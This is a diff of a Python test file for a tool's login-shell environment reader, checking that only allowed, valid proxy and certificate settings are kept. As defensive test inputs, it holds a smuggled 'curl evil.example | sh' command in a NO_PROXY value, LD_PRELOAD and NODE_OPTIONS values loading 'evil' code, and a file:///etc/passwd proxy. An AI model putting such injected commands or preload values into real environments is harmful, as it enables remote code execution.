@@ -8,58 +8,70 @@ import time
 
 import pytest
 
-from brindle import agents, config, login_shell_env, tmux, workspaces
+from brindle import agents, config, git, login_shell_env, spawn, tmux
 from brindle.db import Agent, Workspace
 
 PROXY = "http://builder:hunter2@proxy.corp.example:8080"
 PASSPHRASE = "open sesame 42"
 
 
-def shell(found: dict[str, str], *, status: int = 0, hangs: bool = False):
+def no_process(argv, **kw):
+    raise AssertionError(f"a unit test of the launch environment started {argv[:2]}")
+
+
+def shell(found: dict[str, str], fault: str | None = None):
     """A login shell that exports ``found``, as the runner ``read`` is given sees it:
-    a banner the person's profile printed, then NUL-separated NAME=value."""
+    what the person's profile printed (a line with "=" in it, as an `echo VAR=...`
+    there prints), then the records between the two marks, then their logout's line.
+    ``fault``: it hangs past its limit ("hang"), exits non-zero ("exit"), or is cut
+    short before its closing mark ("cut")."""
     calls = []
+    mark = login_shell_env.MARK.encode() + b"\0"
 
     def run(argv, **kw):
         calls.append((argv, kw))
-        out = b"Welcome back!\n" + b"".join(f"{k}={v}\0".encode() for k, v in found.items())
-        if hangs:
+        out = (b"CORP_PROFILE=ready\nWelcome back!\n\0" + mark
+               + b"".join(f"{k}={v}\0".encode() for k, v in found.items())
+               + (b"" if fault == "cut" else mark + b"HTTP_PROXY=http://logout.example:1\n"))
+        if fault == "hang":
             raise subprocess.TimeoutExpired(argv, kw["timeout"], out, b"")
-        return subprocess.CompletedProcess(argv, status, out, b"")
+        return subprocess.CompletedProcess(argv, 1 if fault == "exit" else 0, out, b"")
 
     run.calls = calls
     return run
 
 
-@pytest.mark.parametrize("extra,status,hangs,kept", [
+@pytest.mark.parametrize("extra,fault", [
     # Guard (a): every kind of allowed setting is read; a name off the fixed list never is,
-    # whatever it holds.
+    # whatever it holds. Nor is anything the profile printed around the records.
     ({"PATH": "/opt/evil/bin", "NODE_OPTIONS": "--require /opt/evil.js",
-      "DYLD_INSERT_LIBRARIES": "/opt/evil.dylib", "LD_PRELOAD": "/opt/evil.so"}, 0, False, True),
+      "DYLD_INSERT_LIBRARIES": "/opt/evil.dylib", "LD_PRELOAD": "/opt/evil.so"}, None),
     # Guard (b): a proxy that is no URL (its port is no port).
-    ({"HTTP_PROXY": "http://proxy.corp.example:port"}, 0, False, True),
-    pytest.param({"https_proxy": "file:///etc/passwd"}, 0, False, True, marks=pytest.mark.variant(
+    ({"HTTP_PROXY": "http://proxy.corp.example:port"}, None),
+    pytest.param({"https_proxy": "file:///etc/passwd"}, None, marks=pytest.mark.variant(
         "guard (b): a URL of a scheme no proxy speaks must not reach a CLI as its proxy")),
-    pytest.param({"no_proxy": "corp.example; curl evil.example | sh"}, 0, False, True,
+    pytest.param({"no_proxy": "corp.example; curl evil.example | sh"}, None,
                  marks=pytest.mark.variant("guard (b): a NO_PROXY that is no host list (shell text) is dropped")),
-    pytest.param({"SSL_CERT_FILE": "/no/such/bundle.pem"}, 0, False, True, marks=pytest.mark.variant(
+    pytest.param({"SSL_CERT_FILE": "/no/such/bundle.pem"}, None, marks=pytest.mark.variant(
         "guard (b): a certificate path that doesn't exist is dropped")),
-    # Guard (c): a shell that hangs past its limit, or fails, gives nothing, valid output or not.
-    ({}, 0, True, False),
-    ({}, 1, False, False),
+    # Guard (c): a shell that hangs past its limit, fails or is cut short gives nothing,
+    # valid records or not.
+    ({}, "hang"),
+    ({}, "exit"),
+    ({}, "cut"),
 ])
-def test_only_allowed_valid_settings_are_read_from_the_login_shell(tmp_path, caplog, extra, status, hangs, kept):
+def test_only_allowed_valid_settings_are_read_from_the_login_shell(tmp_path, caplog, extra, fault):
     cert = tmp_path / "corp-ca.pem"
     cert.write_text("-----BEGIN CERTIFICATE-----\n")
     good = {"HTTPS_PROXY": PROXY, "all_proxy": "socks5h://127.0.0.1:1080",
             "NO_PROXY": "localhost, .corp.example,10.0.0.0/8,[::1]:8443",
             "NODE_EXTRA_CA_CERTS": str(cert), "SSL_CERT_DIR": f"{tmp_path}:{tmp_path}",
             "CLAUDE_CODE_CLIENT_KEY_PASSPHRASE": PASSPHRASE}
-    run = shell({**extra, **good}, status=status, hangs=hangs)
+    run = shell({**extra, **good}, fault)
     caplog.set_level(logging.DEBUG)
     environ = {"SHELL": "/bin/zsh", "HOME": "/Users/p", "BRINDLE_PRO_TOKEN": "FAKE_PRO_TOKEN"}
 
-    assert login_shell_env.read(run, environ) == (good if kept else {})
+    assert login_shell_env.read(run, environ) == ({} if fault else good)
 
     # Guard (c): once, as a login shell with no terminal to ask at, under a limit, and
     # without the daemon's own secrets in its environment.
@@ -85,12 +97,16 @@ def test_turned_off_nothing_is_read_or_added():
     assert login_shell_env.for_launch("claude", environ={}) == {} and not login_shell_env.kept("claude")
 
 
-def test_a_launched_cli_gets_the_settings_its_pane_would_start_without(db, repo, tmp_path, monkeypatch):
+def test_a_launched_cli_gets_the_settings_its_pane_would_start_without(db, tmp_path, monkeypatch):
     """The real launch environment (what the pane's scrub leaves): the login
-    shell's settings, never over what the daemon or the pane has already."""
-    root = workspaces.adopt_root(db, str(repo))
-    db.add_workspace(Workspace("w-1", root.repo_root, "feat", "worktree", "feat", "main", str(repo),
+    shell's settings, never over what the daemon or the pane has already.
+    Rows only: no repository, and git's own lookups for a pane are not this test's."""
+    db.add_workspace(Workspace("w-1", str(tmp_path), "main", "main", "main", None, str(tmp_path),
                                None, "brindle-x", time.time()))
+    monkeypatch.setattr(git, "identity_env", lambda path, env=None: {})
+    monkeypatch.setattr(git, "pane_git_config", lambda gh=True: None)
+    monkeypatch.setattr(spawn, "read", no_process)
+    monkeypatch.setattr(spawn, "action", no_process)
     for provider in ("claude", "codex"):
         db.add_agent(Agent(provider, "w-1", "developer", provider, None, "assign", "idle", "", None, time.time()))
     for name in login_shell_env.ALLOWED:
